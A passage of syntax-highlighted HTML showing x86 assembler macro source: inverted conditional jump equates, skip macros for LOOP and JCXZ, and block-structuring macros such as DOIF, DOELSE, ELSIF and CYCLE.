</span><span class="sc5">_NJBE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNBE</span><span class="sc0">
 </span><span class="sc5">_NJNA</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJBE</span><span class="sc0">
</span><span class="sc5">_NJA</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNA</span><span class="sc0">
 </span><span class="sc5">_NJNBE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJA</span><span class="sc0">
</span><span class="sc5">_NJS</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNS</span><span class="sc0">
</span><span class="sc5">_NJNS</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JS</span><span class="sc0">
</span><span class="sc5">_NJP</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNP</span><span class="sc0">
 </span><span class="sc5">_NJPE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJP</span><span class="sc0">
</span><span class="sc5">_NJNP</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JP</span><span class="sc0">
 </span><span class="sc5">_NJPO</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJNP</span><span class="sc0">
</span><span class="sc5">_NJL</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNL</span><span class="sc0">
 </span><span class="sc5">_NJNGE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJL</span><span class="sc0">
</span><span class="sc5">_NJGE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNGE</span><span class="sc0">
 </span><span class="sc5">_NJNL</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJGE</span><span class="sc0">
</span><span class="sc5">_NJLE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNLE</span><span class="sc0">
 </span><span class="sc5">_NJNG</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJLE</span><span class="sc0">
</span><span class="sc5">_NJG</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc6">JNG</span><span class="sc0">
 </span><span class="sc5">_NJNLE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">_NJG</span><span class="sc0">

</span><span class="sc1">; There are no mirror commands for LOOPxx &amp; JCXZ,</span><span class="sc0">
</span><span class="sc1">; so we're forced to use MACROS in these cases</span><span class="sc0">

</span><span class="sc5">S@KIP</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">opcod</span><span class="sc4">,</span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">Skip_Label</span><span class="sc0">
    </span><span class="sc5">opcod</span><span class="sc0">   </span><span class="sc5">Skip_Label</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">target</span><span class="sc0">
</span><span class="sc5">Skip_Label</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">_NJCXZ</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc5">S@KIP</span><span class="sc0">   </span><span class="sc6">JCXZ</span><span class="sc4">,</span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">_NJLU</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc5">S@KIP</span><span class="sc0">   </span><span class="sc6">LOOP</span><span class="sc4">,</span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">_NJLUNE</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc5">S@KIP</span><span class="sc0">   </span><span class="sc6">LOOPNE</span><span class="sc4">,</span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">_NJLUNZ</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc5">S@KIP</span><span class="sc0">   </span><span class="sc6">LOOPNZ</span><span class="sc4">,</span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">_NJLUE</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc5">S@KIP</span><span class="sc0">   </span><span class="sc6">LOOPE</span><span class="sc4">,</span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">_NJLUZ</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc5">S@KIP</span><span class="sc0">   </span><span class="sc6">LOOPZ</span><span class="sc4">,</span><span class="sc5">target</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

    </span><span class="sc9">ENDM</span><span class="sc0">    </span><span class="sc1">;;**********</span><span class="sc0">

</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄ        Language macros            ÄÄÄÄÄ¿</span><span class="sc0">

</span><span class="sc1">;  Pass next block till the end or DOELSE</span><span class="sc0">
</span><span class="sc5">PASS</span><span class="sc0">    </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">CND</span><span class="sc0">
    </span><span class="sc5">S@T</span><span class="sc0"> </span><span class="sc5">%L@</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">J</span><span class="sc10">@F</span><span class="sc0"> </span><span class="sc5">CND</span><span class="sc4">,</span><span class="sc5">E@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,%</span><span class="sc5">T@E</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">S@T</span><span class="sc0"> </span><span class="sc5">%L@</span><span class="sc0">
    </span><span class="sc5">EL@I</span><span class="sc0">    </span><span class="sc5">%L@</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  Enter next block immediately</span><span class="sc0">
</span><span class="sc5">GOIN</span><span class="sc0">    </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">CND</span><span class="sc0">
    </span><span class="sc5">S@</span><span class="sc0">  </span><span class="sc5">B</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">J</span><span class="sc10">@F</span><span class="sc0"> </span><span class="sc5">CND</span><span class="sc4">,</span><span class="sc5">B@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,%</span><span class="sc5">T</span><span class="sc10">@B</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">S@</span><span class="sc0">  </span><span class="sc5">B</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  Go to the begin of current block</span><span class="sc0">
</span><span class="sc9">REPEAT</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">CND</span><span class="sc0">
    </span><span class="sc5">J@R</span><span class="sc0"> </span><span class="sc5">CND</span><span class="sc4">,</span><span class="sc5">B@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T</span><span class="sc10">@B</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  Go to the end of current block</span><span class="sc0">
</span><span class="sc1">;   (skip all DOELSE's)</span><span class="sc0">
</span><span class="sc5">EXIT</span><span class="sc0">    </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">CND</span><span class="sc0">
    </span><span class="sc5">J</span><span class="sc10">@F</span><span class="sc0"> </span><span class="sc5">CND</span><span class="sc4">,</span><span class="sc5">X@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T@X</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  Go to the next DOELSE if present</span><span class="sc0">
</span><span class="sc1">;   or to the end of current block</span><span class="sc0">
</span><span class="sc5">NEXT</span><span class="sc0">    </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">CND</span><span class="sc0">
    </span><span class="sc5">J</span><span class="sc10">@F</span><span class="sc0"> </span><span class="sc5">CND</span><span class="sc4">,</span><span class="sc5">E@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T@E</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  The begin of a block without</span><span class="sc0">
</span><span class="sc1">;  test of condition</span><span class="sc0">
</span><span class="sc5">DO</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0">
</span><span class="sc5">L@</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">L@</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">S@</span><span class="sc0">  </span><span class="sc5">B</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">M@</span><span class="sc0">  </span><span class="sc5">B@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T</span><span class="sc10">@B</span><span class="sc0">
    </span><span class="sc5">S@T</span><span class="sc0"> </span><span class="sc5">%L@</span><span class="sc0">
    </span><span class="sc5">EL@I</span><span class="sc0">    </span><span class="sc5">%L@</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  The end of a block without loop</span><span class="sc0">
</span><span class="sc5">DONE</span><span class="sc0">    </span><span class="sc9">MACRO</span><span class="sc0">
    </span><span class="sc5">M@</span><span class="sc0">  </span><span class="sc5">X@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T@X</span><span class="sc0">
    </span><span class="sc5">M@</span><span class="sc0">  </span><span class="sc5">E@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T@E</span><span class="sc0">
    </span><span class="sc5">S@</span><span class="sc0">  </span><span class="sc5">X</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">S@</span><span class="sc0">  </span><span class="sc5">E</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">L@</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">L@</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">S@T</span><span class="sc0"> </span><span class="sc5">%L@</span><span class="sc0">
    </span><span class="sc5">EL@I</span><span class="sc0">    </span><span class="sc5">%L@</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  The end of a loop-block</span><span class="sc0">
</span><span class="sc5">CYCLE</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">CND</span><span class="sc0">
    </span><span class="sc9">REPEAT</span><span class="sc0">  </span><span class="sc5">CND</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  The begin of a block with</span><span class="sc0">
</span><span class="sc1">;  condition test</span><span class="sc0">
</span><span class="sc5">DOIF</span><span class="sc0">    </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">CND</span><span class="sc0">
</span><span class="sc5">L@</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">L@</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">S@T</span><span class="sc0"> </span><span class="sc5">%L@</span><span class="sc0">
    </span><span class="sc5">J</span><span class="sc10">@F</span><span class="sc0"> </span><span class="sc5">CND</span><span class="sc4">,</span><span class="sc5">E@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T@E</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">S@</span><span class="sc0">  </span><span class="sc5">B</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">M@</span><span class="sc0">  </span><span class="sc5">B@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T</span><span class="sc10">@B</span><span class="sc0">
    </span><span class="sc5">EL@I</span><span class="sc0">    </span><span class="sc5">%L@</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  The alternative block part begin operator</span><span class="sc0">
</span><span class="sc5">DOELSE</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0">
    </span><span class="sc5">EXIT</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc5">LNG</span><span class="sc0">
    </span><span class="sc5">S@T</span><span class="sc0"> </span><span class="sc5">%L@</span><span class="sc0">
    </span><span class="sc5">M@</span><span class="sc0">  </span><span class="sc5">E@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T@E</span><span class="sc0">
    </span><span class="sc5">S@</span><span class="sc0">  </span><span class="sc5">E</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">EL@I</span><span class="sc0">    </span><span class="sc5">%L@</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;  The enclosed IF (DOIF-{DOELSE-ELSIF...}-DONE)</span><span class="sc0">
</span><span class="sc5">ELSIF</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">CND</span><span class="sc0">
    </span><span class="sc5">EL@I</span><span class="sc0">    </span><span class="sc5">%L@</span><span class="sc0">
    </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">TL@</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">.err</span><span class="sc0">    </span><span class="sc4">*****</span><span class="sc0">   </span><span class="sc5">STAR</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">ELSIF</span><span class="sc0"> </span><span class="sc5">without</span><span class="sc0"> </span><span class="sc5">DOELSE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">PASS</span><span class="sc0">   </span><span class="sc4">*****</span><span class="sc0">
    </span><span class="sc9">ELSE</span><span class="sc0">
    </span><span class="sc5">J</span><span class="sc10">@F</span><span class="sc0"> </span><span class="sc5">CND</span><span class="sc4">,</span><span class="sc5">E@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">,%</span><span class="sc5">T@E</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">S@</span><span class="sc0">  </span><span class="sc5">B</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">M@</span><span class="sc0">  </span><span class="sc5">B@</span><span class="sc4">,%</span><span class="sc5">L@</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,%</span><span class="sc5">T</span><span class="sc10">@B</span><span class="sc0">
    </span><span class="sc5">S@T</span><span class="sc0"> </span><span class="sc5">%L@</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc5">EL@I</span><span class="sc0">    </span><span class="sc5">%L@</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

    </span><span class="sc5">INITS</span><span class="sc0">       </span><span class="sc1">;Variables initialization</span><span class="sc0">
</span></div></body>
</html>
